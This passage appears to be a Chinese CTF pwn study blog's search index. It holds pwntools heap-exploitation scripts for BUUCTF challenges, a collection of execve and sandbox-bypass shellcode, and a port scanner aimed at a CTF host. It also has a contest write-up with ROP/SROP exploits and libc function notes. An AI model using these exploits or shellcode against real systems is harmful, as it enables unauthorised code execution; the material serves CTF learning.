process(&quot;./heap&quot;)add(0x10)  # 0add(0x10)  # 1add(0x10)  # 2add(0x80)  # 3free(1)  # 释放1free(2)  # 释放2fill(0, b&quot;a&quot; * 0x10 + p64(0) + p64(0x21) + b&quot;a&quot; * 0x10 + p64(0) + p64(0x21) + p8(0x60))  # 使2指向3add(0x10)  # 申请回来2编号为1fill(1, b&quot;a&quot; * 0x10 + p64(0) + p64(0x21))add(0x10)  # 申请到3编号为2add(0x80)  # 防止合并，编号为4fill(1, b&quot;a&quot; * 0x10 + p64(0) + p64(0x91))free(3)  # 把3放到uns# attach(p)dump(2)  # dump(2)#查看3中的libclibc = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:] + b&quot;\\0&quot; * 2)malloc_hook = libc - 0x68libc_base = libc + 0x7f7a5ee00000 - 0x7f7a5f1c4b78one_gadget = one[1] + libc_baseprint(hex(libc))success(hex(malloc_hook))add(0x60)  # 取出一部分3,编号为3free(3)fill(1,b&quot;a&quot; * 0x10 + p64(0) + p64(0x71)+p64(malloc_hook-0x23))add(0x60)add(0x60)#attach(p)fill(5,b&#x27;a&#x27;*0x13+p64(one_gadget))add(10)p.interactive()\n\n[ZJCTF 2019]EasyHeap思路本题也是直接给了栈溢出，不过没有show函数，没法泄露libc\n直接给了system函数，但是我一开始不会用，于是有了一个离奇的办法，伪造一个chunk到got表，free函数在got表的第一个，我把one_gadget塞里面去，需要爆破，概率是1&#x2F;16\nfrom pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;one = [0x45216, 0x4526a,0xf1147,0xf02a4]def add(size, context):    p.sendafter(&quot;Your choice :&quot;, &quot;1&quot;)    p.sendafter(&quot;Size of Heap :&quot;, str(size))    p.sendafter(&quot;Content of heap:&quot;, context)def fill(index, context):    p.sendafter(&quot;Your choice :&quot;, &quot;2&quot;)    p.sendafter(&quot;Index :&quot;, str(index))    p.sendafter(&quot;Size of Heap :&quot;, str(size(context)))    p.sendafter(&quot;Content of heap :&quot;, context)def free(index):    p.sendafter(&quot;Your choice :&quot;, &quot;3&quot;)    p.sendafter(&quot;Index :&quot;, str(index))# def dump(index):#     p.sendafter(&quot;Your choice :&quot;,&quot;4&quot;)#     p.sendafter(&quot;Index:&quot;, str(index))for i in range(100):    try:        #p = process(&quot;./easyheap&quot;)        p=remote(&quot;node4.buuoj.cn&quot;,25384)        add(0x10, b&#x27;a&#x27;)  # 0        add(0x50, b&#x27;a&#x27;)  # 1        add(0x10, b&#x27;a&#x27;)  # 2,fang he bing        free(1)        fill(0, b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x61) + p64(0x601ffa))        add(0x50, b&#x27;a&#x27;)  # 3        add(0x50, b&#x27;a&#x27; * (0x602018 - 0x601ffa - 0x10) + p8(0xa4) + p8(0x02) + p8(0xef))  # 4,magic 0x45216 0xf02a4        #attach(p)        free(0)        p.sendline(&quot;cat flag&quot;)        p.interactive()    except:        pass       \n\n看了看佬的exp，稍微改了一下我的\n改进版（有问题）from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;one = [0x45216, 0x4526a,0xf1147,0xf02a4]def add(size, context):    p.sendafter(&quot;Your choice :&quot;, &quot;1&quot;)    p.sendafter(&quot;Size of Heap :&quot;, str(size))    p.sendafter(&quot;Content of heap:&quot;, context)def fill(index, context):    p.sendafter(&quot;Your choice :&quot;, &quot;2&quot;)    p.sendafter(&quot;Index :&quot;, str(index))    p.sendafter(&quot;Size of Heap :&quot;, str(size(context)))    p.sendafter(&quot;Content of heap :&quot;, context)def free(index):    p.sendafter(&quot;Your choice :&quot;, &quot;3&quot;)    p.sendafter(&quot;Index :&quot;, str(index))# def dump(index):#     p.sendafter(&quot;Your choice :&quot;,&quot;4&quot;)#     p.sendafter(&quot;Index:&quot;, str(index))p = process(&quot;./easyheap&quot;)#p = remote(&quot;node4.buuoj.cn&quot;, 25384)add(0x10, b&#x27;/bin/sh&#x27;)  # 0add(0x50, b&#x27;a&#x27;)  # 1add(0x10, b&#x27;/bin/sh\\0&#x27;)  # 2,fang he bingfree(1)fill(0, b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x61) + p64(0x601ffa))add(0x50, b&#x27;a&#x27;)  # 3add(0x50, b&#x27;a&#x27; * (0x602018 - 0x601ffa - 0x10) + p64(0x400700))  # 4,magic 0x45216 0xf02a4attach(p)free(2)p.interactive()\n\n问题很简单，system函数未被调用，所以got还需初始化，而我们修改free的时候把基地址破坏掉了\n如果想要打通，可以先跑一次system，懒得搞了\n最终版在bss段里的，自创的chuck表上方下方创建chunk，修改chunk0的地址，改到free函数的got表，修改got表，改为system，再free一个写有&#x2F;bin&#x2F;sh的chunk，就变成了system（“&#x2F;bin&#x2F;sh”）\nfrom pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;one = [0x45216, 0x4526a,0xf1147,0xf02a4]def add(size, context):    p.sendafter(&quot;Your choice :&quot;, &quot;1&quot;)    p.sendafter(&quot;Size of Heap :&quot;, str(size))    p.sendafter(&quot;Content of heap:&quot;, context)def fill(index, context):    p.sendafter(&quot;Your choice :&quot;, &quot;2&quot;)    p.sendafter(&quot;Index :&quot;, str(index))    p.sendafter(&quot;Size of Heap :&quot;, str(size(context)))    p.sendafter(&quot;Content of heap :&quot;, context)def free(index):    p.sendafter(&quot;Your choice :&quot;, &quot;3&quot;)    p.sendafter(&quot;Index :&quot;, str(index))# def dump(index):#     p.sendafter(&quot;Your choice :&quot;,&quot;4&quot;)#     p.sendafter(&quot;Index:&quot;, str(index))p = process(&quot;./easyheap&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 28047)add(0x10, b&#x27;a&#x27;)  # 0add(0x60, b&#x27;a&#x27;)  # 1add(0x10, b&#x27;/bin/sh\\0&#x27;)  # 2,fang he bingfree(1)fill(0, b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x71) + p64(0x6020ad))add(0x60, b&#x27;a&#x27;)  # 1add(0x60, b&#x27;a&#x27; * 0x23 + p64(0x602018))  # 3,magic 0x45216 0xf02a4fill(0,p64(0x00400700))#attach(p)free(2)p.interactive()\n\nUAF练手小题有一个chunk存输出函数，申请一个等大的堆，倒腾了两下，跳后门去了\np = remote(&quot;node4.buuoj.cn&quot;, 25065)magic=0x8048945add(0x8,b&#x27;a&#x27;)add(0x20,b&#x27;a&#x27;)add(0x8,b&#x27;a&#x27;)free(0)free(1)add(0x8,p32(magic))#attach(p)p.interactive()\n","categories":["笔记"],"tags":["堆","学习"]},{"title":"比较杂的模板","url":"/2023/09/26/%E6%AF%94%E8%BE%83%E6%9D%82%E7%9A%84%E6%A8%A1%E6%9D%BF/","content":"最短shellcodei386长度18\npush   0xbpop    eaxpush   ebxpush   0x68732f2fpush   0x6e69622fmov    ebx,espint    0x80\n\n amd64长度22\nxor \trsi,\trsi\t\t\tpush\trsi\t\t\t\tmov \trdi,\t0x68732f2f6e69622f\t push\trdipush\trsp\t\tpop\trdi\t\t\t\tmov \tal,\t59\t\t\tcdq\t\t\t\t\tsyscall\n\n沙盒下最短shellcode64位\nshellcode=&#x27;&#x27;&#x27;    xor rax, rax   #xor rax,rax是对rax的清零运算操作    xor rdi, rdi   #清空rdi寄存器的值    xor rsi, rsi   #清空rsi寄存器的值    xor rdx, rdx    mov rax, 2      #open调用号为2    mov rdi, 0x67616c662f2e   #为galf/.为./flag的相反   0x67616c662f2e为/flag的ASCII码的十六进制    push rdi    mov rdi, rsp    syscall   #系统调用前，linux在eax寄存器里写入子功能号，断止处理程序根据eax寄存器的值来判断用户进程申请哪类系统调用。    mov rdx, 0x100   #sys_read(3,file,0x100)    mov rsi, rdi    mov rdi, rax    mov rax, 0      #read调用号为0,0为文件描述符，即外部输入，例如键盘    syscall        mov rdi, 1      #sys_write(1,file,0x30)    mov rax, 1      #write调用号为1,1为文件描述符，指的是屏幕    syscall&#x27;&#x27;&#x27;\n\n32位\nshellcode = &quot;&quot;&quot;/*open(./flag)*/push 0x1010101xor dword ptr [esp], 0x1016660push 0x6c662f2emov eax,0x5mov ebx,espxor ecx,ecxint 0x80/*read(fd,buf,0x100)*/mov ebx,eaxmov ecx,espmov edx,0x30mov eax,0x3int 0x80/*write(1,buf,0x100)*/mov ebx,0x1mov eax,0x4int 0x80&quot;&quot;&quot;\n\n32位b&#x27;j\\x0bXSh//shh/bin\\x89\\xe3\\xcd\\x80&#x27;\n\npush   0xbpop    eaxpush   ebxpush   0x68732f2fpush   0x6e69622fmov    ebx,espint    0x80\n\n64位b&#x27;H1\\xf6VH\\xbf/bin//shWT_\\xb0;\\x99\\x0f\\x05&#x27;\n\nxor \trsi,\trsi\t\t\tpush\trsi\t\t\t\tmov \trdi,\t0x68732f2f6e69622f\t push\trdipush\trsp\t\tpop\trdi\t\t\t\tmov \tal,\t59\t\t\tcdq\t\t\t\t\tsyscall\n\n\n32位 短字节shellcode –&gt; 21字节\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\n32位 纯ascii字符shellcodePYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA\n32位 scanf可读取的shellcode\\xeb\\x1b\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x29\\xc0\\xaa\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x29\\xc0\\xab\\xb0\\x08\\x04\\x03\\xcd\\x80\\xe8\\xe0\\xff\\xff\\xff&#x2F;bin&#x2F;sh\n64位 scanf可读取的shellcode 22字节\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n64位 较短的shellcode  23字节\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\n64位 纯ascii字符shellcodePh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\nfmt查看栈神器for i in range(1,30):    payload1=b&#x27;AAAA.%&#x27;+str(i).encode()+b&#x27;$p!&#x27;    p.sendlineafter(&quot;3.Buf overflow&quot;, b&#x27;1&#x27;)    sleep(0.1)    p.sendline(payload1)    t=p.recvuntil(&#x27;!&#x27;)[6:-1]    stack.append(t)\n","categories":["笔记","模板"],"tags":["模板","杂"]},{"title":"容易忘的小知识","url":"/2023/09/22/%E5%AE%B9%E6%98%93%E5%BF%98%E7%9A%84%E5%B0%8F%E7%9F%A5%E8%AF%86/","content":"64位传参顺序6个参数及以内时参数从左到右加入寄存器时：rdi，rsi，rdx，rcx，r8，r9\n当参数为7个以上时前6个与前面一样，但后面的依次从起，当参数对齐7个时，参数从左到右加入寄存器时：rdi，rsi，rdx，rcx，r8，r9。六个以上的内容加入栈中，即和32位组装一样。\n函数原型open（open64）函数int open(const char *path, int access, int mode);\n\n 参数解释： path：要打开的文件路径和名称。 access：访问模式，宏定义和含义如下： – O_RDONLY（1）：只读打开； – O_WRONLY（2）：只写打开； – O_RDWR（4）：读写打开； 还可选择以下模式与以上3种基本模式相与： – O_CREAT（0x0100）创建一个文件并打开； – O_TRUNC（0x0200）打开一个已存在的文件并将文件长度设置为0，其他属性保持； – O_EXCL（0x0400）未使用； – O_APPEND（0x0800）追加打开文件； – O_TEXT（0x4000）打开文本文件翻译CR-LF控制字符； – O_BINARY（0x8000）打开二进制字符，不作CR-LF翻译； mode：该参数仅在access&#x3D;O_CREAT方式下使用，其取值如下： – S_IFMT（0xF000）：文件类型掩码； – S_IFDIR（0x4000）：目录； – S_IFIFO（0x1000）：FIFO 专用； – S_IFCHR（0x2000）：字符专用； – S_IFBLK（0x3000）：块专用； – S_IFREG（0x8000）：只为0x0000； – S_IREAD（0x0100）：可读； – S_IWRITE（0x0080）：可写； – S_IEXEC（0x0040）：可执行；\nfopen函数函数原型：\n**FILE *fopen(char *filename, char *mode);**\n\n 参数解释： – filename：文件名称。 – mode：打开模式： r：只读方式打开一个文本文件（该文件必须存在）； r+：可读可写方式打开一个文本文件（该文件必须存在）； w：只写方式打开一个文本文件（若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件）； w+：可读可写方式创建一个文本文件（若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件）； a：追加方式打开一个文本文件（若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留））； a+：可读可写追加方式打开一个文本文件（若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留））； rb：只读方式打开一个二进制文件（使用法则同r）； rb+：可读可写方式打开一个二进制文件（使用法则同r+）； wb：只写方式打开一个二进制文件（使用法则同w）； wb+：可读可写方式生成一个二进制文件（使用法则同w+）； ab：追加方式打开一个二进制文件（使用法则同a）； ab+：可读可写方式追加一个二进制文件（使用法则同a+）； 返回参数： 文件顺利打开后，指向该流的文件指针就会被返回。若果文件打开失败则返回NULL，并把错误代码存在errno  中。一般而言，打开文件后会作一些文件读取或写入的动作，若打开文件失败，接下来的读写动作也无法顺利进行，所以在fopen()后请作错误判断及处理。\n两者的区别前者属于低级IO，后者是高级IO。  前者返回一个文件描述符，后者返回一个文件指针。  前者无缓冲，后者有缓冲。  前者与 read, write 等配合使用， 后者与 fread, fwrite等配合使用。  后者是在前者的基础上扩充而来的，在大多数情况下，用后者。\nwrite函数原型**\nssize_t write(int fd, const void *buf, size_t count);\n\n调用该函数时，需要有三个参数，下面简单的介绍下这三个参数的含义。\nfd：要操作的文件的文件描述符，通过open函数打开文件时获取。\nbuf：指定写入数据对应的缓冲区，可以将需要的写入的内容存放到buf中，再将其写入文件里。\ncount：指定写入的字节数，单位是字节。\n返回值：如果写操作顺利完成，则会返回写入的字节数；如果返回值为0，则表示未向文件中写入任何字符；如果写入出错，则会返回-1。\n一般来说fd&#x3D;1时标准输出，fd&#x3D;文件fd时输出到文件\nread函数原型C语言中，read函数是用于从文件描述符中读取数据的函数，其原型如下：\n#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);\n\nread函数的参数如下：\n\nfd：文件描述符，指定要读取的文件或套接字的标识符。\nbuf：指向存储读取数据的缓冲区的指针。\ncount：要读取的最大字节数。\n\nread函数的返回值是实际读取的字节数。如果返回值为0，表示已到达文件末尾；如果返回值为-1，表示读取出错。\n需要注意的是，read函数是一个阻塞函数，当没有数据可读时，它会一直等待直到有数据可读或出现错误。如果需要非阻塞读取数据，可以使用select或poll等函数进行操作。\n一般来说fd&#x3D;0时标准输入，fd&#x3D;文件fd时读取文件\nfd描述符0，1，2 这三个 fd 值已经被赋予特殊含义，分别是标准输入（ STDIN_FILENO ），标准输出（ STDOUT_FILENO ），标准错误（ STDERR_FILENO ）\nputs函数int puts(const char *s);\n\nprintf函数printf 函数原型为\nint printf(const char *fmt, ...)\n\n后面的参数以fmt的内容定\nmprotect函数#include &lt;unistd.h&gt;   #include &lt;sys/mmap.h&gt;   int mprotect(const void *start, size_t len, int prot);\n\nmprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。\nprot可以取以下几个值，并且可以用“|”将几个属性合起来使用：\n1）PROT_READ：表示内存段内的内容可读；\n2）PROT_WRITE：表示内存段内的内容可写；\n3）PROT_EXEC：表示内存段中的内容可执行；\n4）PROT_NONE：表示内存段中的内容根本没法访问。\n需要指出的是，锁指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。\n如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个：\n1）EACCES\n该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。\n2）EINVAL\nstart 不是一个有效的指针，指向的不是某个内存页的开头。\n3）ENOMEM\n内核内部的结构体无法分配。\n4）ENOMEM\n进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。\n如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程。\nMemsetvoid *memset(void *str, int c, size_t n)\n\n 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。其返回值是一个指向 str 的指针\nSprintfint sprintf(char *str, const char *format, ...) \n\n发送格式化输出到 str 所指向的字符串。\n第二第三个参数对应了 printf 的第一第二个参数，只是多了个输出到的位置，以及检查标签个数和参数个数相同。\n如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。\nStrncmpint strncmp(const char *str1, const char *str2, size_t n)\n\n把 str1 和 str2 进行比较，最多比较前 n 个字节。\n这个比较是通过逐个比较ascii码实现的，遇到ascii码不同直接返回\n如果返回值 &lt; 0，则表示 str1 小于 str2。\n如果返回值 &gt; 0，则表示 str1 大于 str2。\n如果返回值 &#x3D; 0，则表示 str1 等于 str2。\nfgetsfgets函数功能为从指定的流中读取数据，每次读取一行。其原型为：\nchar *fgets(char *str, int n, FILE *stream);\n\n从指定的流 stream 读取一行，并把它存储在 str  所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。\nscanf()原型： \n`int scanf(const char *format, ...);`\n\n","categories":["复习"],"tags":["复习","备忘"]},{"title":"渗透入门","url":"/2023/10/17/%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8/","content":"多线程nc扫描器from pwn import *import threadingcontext(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)def thread_function(portstart, keyword, cishu, timeout,pinglv):    rec = &#x27;&#x27;    for j in range(cishu):        try:            p = remote(&quot;ctf.qwq.cc&quot;, portstart + j * pinglv, timeout=timeout)            sleep(0.1)            t = p.recvline(timeout=timeout)            rec=t        except:            continue            pass        print(rec)        if rec != b&#x27;&#x27;:            with open(&quot;ports_of_cc2&quot; + &quot;.txt&quot;, &#x27;a+&#x27;) as f:                f.write(&quot;ports:&quot;+str(portstart + j * pinglv)+ str(rec)+&#x27;\\n&#x27;)                f.close()pinglv = 5000  # 这里是pl，可以自定义keyword = b&#x27;.&#x27;start_port = 10000end_port = 20000cishu = (end_port - start_port) // pinglvthreads = []# 循环创建并启动线程for i in range(0, pinglv):    thread = threading.Thread(target=thread_function, args=(start_port+i, keyword, cishu,5,pinglv))    threads.append(thread)    thread.start()# 等待所有线程结束for thread in threads:    thread.join()\n","categories":["笔记"],"tags":["渗透","扫描器"]},{"title":"pwn从头开始的复习（工具篇）","url":"/2023/08/26/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AF%87%EF%BC%89/","content":"前言开学在即，复习一遍pwn。顺便给后人留点东西。\n所需软件及软件包写笔记用：Typora （便于上传博客，再没用过word写笔记）\nc语言：code blocks（代码补全，报错提示和调试做得都很好，而且比用来写项目的操作简单打开快）\nPython：PyCharm（好用没得说）\n编辑二进制：vscode（免费且插件多，必备）配置hex editor\n查看程序源代码和反汇编：ida \n另外：需要一款科学上网软件。由于本篇文章要上云，我就不提了。\nLinux64位虚拟机乌班图和kali都可，建议乌班图，虽然kali主打一个网络安全，但乌班图支持的软件更多一些。\n下面是虚拟机里面需要的东西：python3（无需编辑器，在主机编，虚拟机带不动，能运行就行）\npython需要的软件包（安装指令去csdn找）：\n1.pwntools\n2.pwngdb\n3.libcsearcher\n需要安装的指令：\n1.Onegadget\n2.ROPgadget\n这些搞完就可以做题了\n学习资源参照西电的pdf，一篇就够了，一千多页\nchatgpt，不懂就问它，它真什么都会\n刷题网站buuctf，pwn按照解出人数排，第一页做完就算入门了，做两页就行，后面的难度层次不齐\n西电ctf，我自己也在做，每年都开两个月，质量蛮不错\n做不出来的百度一下，这些网站比较大众，每题都有人写WP和总结\n","categories":["复习"],"tags":["复习","工具"]},{"title":"23秋校赛WP","url":"/2023/10/25/%E7%A7%8B%E6%A0%A1%E8%B5%9BWP/","content":"个人信息比赛昵称：不会pwn就哭\n姓名：贺宇超\nezloginfrom pwn import *context.log_level=&quot;debug&quot;#p=process(&#x27;./maybeheap&#x27;)for i in range(1,20):    p = remote(&quot;ctf.v50to.cc&quot;, 10468)    p.sendlineafter(&quot;Choice:&quot;, b&#x27;1&#x27;)    #attach(p)    p.sendlineafter(&quot;Enter index (0-9) to add a new Chunk: &quot;, str(i*-1))    p.sendlineafter(&quot;Enter name for the new Chunk (up to 16 characters): &quot;, p64(0x0401228))    p.interactive()\n\nmaybeheapfrom pwn import *context.log_level=&quot;debug&quot;#p=process(&#x27;./maybeheap&#x27;)for i in range(1,20):    p = remote(&quot;ctf.v50to.cc&quot;, 10468)    p.sendlineafter(&quot;Choice:&quot;, b&#x27;1&#x27;)    #attach(p)    p.sendlineafter(&quot;Enter index (0-9) to add a new Chunk: &quot;, str(i*-1))    p.sendlineafter(&quot;Enter name for the new Chunk (up to 16 characters): &quot;, p64(0x0401228))    p.interactive()\n\nezcsu（企图用非srop的方法做，练练手，有个寄存器没法控制，失败了）from pwn import *context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)context.log_level=&quot;debug&quot;p=process(&#x27;./ezcsu&#x27;)#p = remote(&quot;ctf.v50to.cc&quot;, 11295)rdi_ret=0x00000000004007f3rsi_r15_ret=0x00000000004007f1eax_0_leave_ret=0x00000000040075Csys_1_write=0x0000000000400777sys_ret=0x000000000040077Emain=0x0000000004006F3rbp_ret=0x0000000000400620one=0x45226rbx_rbp_r12_13_14_15=0x0000000004007EAset_eax_0=0x000000000400727payload=0x68*b&#x27;a&#x27;+p64(rdi_ret)+p64(0)+p64(rsi_r15_ret)+p64(0x000000000601038)+p64(0)+p64(sys_ret)\\        +p64(0x000000000400727)+p64(rsi_r15_ret)+p64(0x000000000601040)+p64(0)\\        +p64(sys_ret)+p64(rbp_ret)+p64(0x000000000601038)+p64(eax_0_leave_ret)p.sendlineafter(&quot; power!!&quot;,payload)pause()payload=p64(0x00000000004007f2)p.send(payload)pause()attach(p)payload=p64(rsi_r15_ret)+p64(0x000000000601008)+p64(0)+p64(sys_ret)\\        +p64(set_eax_0)+p64(rsi_r15_ret)+p64(0x00000000060100a)+p64(0)+p64(sys_ret)\\    +p64(rdi_ret)+p64(0x000000000601008)+p64(sys_ret)+p64(set_eax_0)\\    +p64(rdi_ret)+p64(3)+p64(rsi_r15_ret)+p64(0x3fd000)+p64(0)+p64(sys_ret)\\    +p64(rdi_ret)+p64(1)+p64(rsi_r15_ret)+p64(0x3fd000)+p64(0)+p64(sys_ret)p.send(payload)pause()p.send(b&#x27;fl&#x27;)pause()p.send(b&#x27;ag&#x27;)p.interactive()\n\nezcsu（最终版）from pwn import *context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)context.log_level=&quot;debug&quot;#p=process(&#x27;./ezcsu&#x27;)p = remote(&quot;ctf.v50to.cc&quot;, 11295)rdi_ret=0x00000000004007f3rsi_r15_ret=0x00000000004007f1eax_0_leave_ret=0x00000000040075Csys_1_write=0x0000000000400777sys_ret=0x000000000040077Emain=0x0000000004006F3rbp_ret=0x0000000000400620one=0x45226rbx_rbp_r12_13_14_15=0x0000000004007EAset_eax_0=0x000000000400727payload=0x68*b&#x27;a&#x27;+p64(rdi_ret)+p64(0)+p64(rsi_r15_ret)+p64(0x000000000601038)+p64(0)+p64(sys_ret)\\        +p64(0x000000000400727)+p64(rsi_r15_ret)+p64(0x000000000601040)+p64(0)\\        +p64(sys_ret)+p64(rbp_ret)+p64(0x000000000601038)+p64(eax_0_leave_ret)p.sendlineafter(&quot; power!!&quot;,payload)#pause()payload=p64(0x00000000004007f2)p.send(payload)frame = SigreturnFrame(kernel=&quot;amd64&quot;)frame.rax = 59frame.rdi = 0x000000000601008frame.rsi = 0frame.rdx = 0frame.rip = sys_retpayload=p64(rsi_r15_ret)+p64(0x000000000601008)+p64(0)+p64(sys_ret)+p64(sys_ret)+b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x10`\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00~\\x07@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x003\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;#attach(p)pause()p.send(payload)p.send(b&#x27;/bin/sh\\x00&#x27;+b&#x27;a&#x27;*7)p.interactive()&#x27;&#x27;&#x27;0x00000000004007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ee : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop r14 ; pop r15 ; ret0x00000000004007f2 : pop r15 ; ret0x00000000004007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ef : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400620 : pop rbp ; ret0x00000000004007f3 : pop rdi ; ret0x00000000004007f1 : pop rsi ; pop r15 ; ret0x00000000004007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400539 : ret0x0000000000400542 : ret 0x200a&#x27;&#x27;&#x27;\n\n\n\n人生重开（做过，省略）ezcheckin好多后门，一个知识点：Linux命令“;”表示再执行下一条，而sh单独也可以作为shell\n所以溢出返回地址到;sh那一条去\nezropfrom pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)elf=ELF(&#x27;rop&#x27;)p=remote(&#x27;ctf.v50to.cc&#x27;,11822)#p=process(&#x27;./rop&#x27;)exit_got=elf.got[&#x27;_exit&#x27;]open_plt=elf.plt[&#x27;open&#x27;]read_plt=elf.plt[&#x27;read&#x27;]write_plt=elf.plt[&#x27;write&#x27;]pop_rdi_ret=0x0000000000401483pop_rsi_r15_ret=0x0000000000401481pop_rbp_ret=0x00000000004011fdp.sendlineafter(&quot;your choice:&quot;,b&#x27;4919&#x27;)payload=b&#x27;a&#x27;*256+p64(0x000000000404060+0x100+0x500+8)+p64(0x000000000401304)sleep(1)p.send(payload)sleep(1)#attach(p)#起始于0x000000000404060+0x100+0x500+8payload=(p64(pop_rdi_ret)+p64(0x000000000404060+0x100+0x500+8-104)+p64(pop_rsi_r15_ret)+p64(4)+p64(0)+\\         p64(open_plt)+p64(pop_rbp_ret)+p64(4212328+0x70-0x100-0x30)+p64(0x000000000401304)+\\         p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_r15_ret)+p64(0x000000000404060)+p64(0)+\\         p64(read_plt)+p64(pop_rdi_ret)+p64(1)+p64(write_plt)+p64(0x00000000040139C)+b&#x27;./flag\\x00r\\x00&#x27;         ).ljust(256,b&#x27;a&#x27;)+p64(0x000000000404060+0x500)+p64(0x000000000401304)        #0x100p.send(payload)#跳转到0x000000000404060+0x500sleep(1)p.send(b&#x27;lalala&#x27;)sleep(1)p.send(b&#x27;lalala&#x27;)p.interactive()&#x27;&#x27;&#x27;Gadgets information============================================================0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401480 : pop r14 ; pop r15 ; ret0x0000000000401482 : pop r15 ; ret0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004011fd : pop rbp ; ret0x0000000000401483 : pop rdi ; ret0x0000000000401481 : pop rsi ; pop r15 ; ret0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040101a : ret0x0000000000401277 : ret 0x2be&#x27;&#x27;&#x27;\n\n\n\nheapfrom pwn import 